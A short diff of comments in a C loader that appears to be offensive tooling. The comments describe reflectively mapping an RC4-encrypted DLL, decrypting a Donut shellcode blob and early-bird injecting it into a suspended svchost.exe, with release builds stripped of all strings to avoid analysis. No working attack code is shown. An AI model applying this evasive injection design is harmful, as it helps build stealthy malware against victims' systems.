@@ -3,10 +3,9 @@
  * RC4-encrypted Donut sRDI blob into a sacrificial process.
  *
  * This translation unit is compiled as an in-memory-only DLL: the stager
- * executable (stager.c) carries it RC4-encrypted, reflectively maps it, and
- * calls the exported Run() with the RC4-encrypted blob and key. Both
- * the stage code and the shellcode reach memory only as RC4 ciphertext in
- * the stager's RCDATA resources; neither is a runnable PE on disk.
+ * executable (stager.c) carries it RC4-encrypted in RCDATA resources,
+ * reflectively maps it, and calls the exported Run() with the RC4-encrypted
+ * blob and key.
  *
  * Run() decrypts the blob and spawns the sacrificial process (default
  * svchost.exe) suspended, then "early birds" it: the blob is written to a
@@ -102,10 +101,7 @@ static SIZE_T g_inject_size = 0;
 /* ------------------------------------------------------------------ utils */
 
 /*
- * LOG() is the only logging path. In production builds (no -DDEBUG) it
- * compiles to nothing, so every diagnostic call site -- and its format
- * string -- vanishes from the image: the shipped binary carries no
- * descriptive text at all. Build with -DDEBUG (build.sh --debug) for
+ * LOG() is the only logging path. Build with -DDEBUG (build.sh --debug) for
  * verbose diagnostics.
  */
 #ifdef DEBUG
@@ -970,7 +966,7 @@ static void print_usage(void) {
   wprint(L"usage: %s [--run]\n", g_service_name);
 #endif
 #else
-  (void)0; /* release images carry no help text */
+  (void)0;
 #endif
 }
 
